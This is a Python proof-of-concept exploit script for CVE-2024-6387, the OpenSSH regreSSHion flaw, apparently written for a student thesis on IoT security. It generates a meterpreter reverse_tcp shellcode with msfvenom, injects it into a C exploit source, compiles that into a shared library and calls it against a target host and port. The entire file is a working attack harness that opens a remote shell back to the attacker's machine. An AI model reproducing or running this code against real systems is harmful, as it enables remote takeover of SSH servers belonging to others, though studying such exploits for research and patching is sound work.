# PoC para la vulnerabilidad CVE-2024-6387 para el TFG IdIoT
# Basado en: https://github.com/Karmakstylez/CVE-2024-6387
import os
import ctypes

def create_exploit(nic):
    print(f"[+] Creating exploit...")
    ip = os.popen(f'ip addr show {nic}').read().split("inet ")[1].split("/")[0]

    cmd1 = 'cp PoC-CVE-2024-6387.c PoC-CVE-2024-6387-ex.c'
    os.system(cmd1)
    os.sync()
    #msfvenom is required when creating the exploit / You can use a different script here to initiate your code 
    cmd2 = (f'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT=9999 -f c -v shellcode')
    output = (os.popen(cmd2).read())

    with open('PoC-CVE-2024-6387-ex.c', 'r') as file:
        data = file.readlines()
        data[49] = f'{output}\n'
    with open('PoC-CVE-2024-6387-ex.c', 'w') as file:
        file.writelines(data)
        print()
        file.close()

    cmd3 = (f'gcc -shared -o exploit.so -fPIC PoC-CVE-2024-6387-ex.c')
    os.system(cmd3)
    os.remove('PoC-CVE-2024-6387-ex.c')

def exploit_vulnerability(target, port, nic):
    # Create the exploit
    create_exploit(nic)

    # Call the C function
    if os.path.isfile('exploit.so'):
        lib = ctypes.CDLL('./exploit.so')
        lib.exploit_vulnerability.argtypes = [ctypes.c_char_p, ctypes.c_int]
        lib.exploit_vulnerability.restype = ctypes.c_int
        result = lib.exploit_vulnerability(target.encode(), port)
        if result == 0:
            print("Exploitation successful!")
        else:
            print("Exploitation failed.")
    else:
        print("Cannot initiate exploitation, due to exploit.so no created! Please create exploit.so first!")

if __name__ == "__main__":
    print("CVE-2024-6387 PoC")
    target = "127.0.0.1"
    port = 8022
    nic = "wlp3s0"
    exploit_vulnerability(target,port,nic)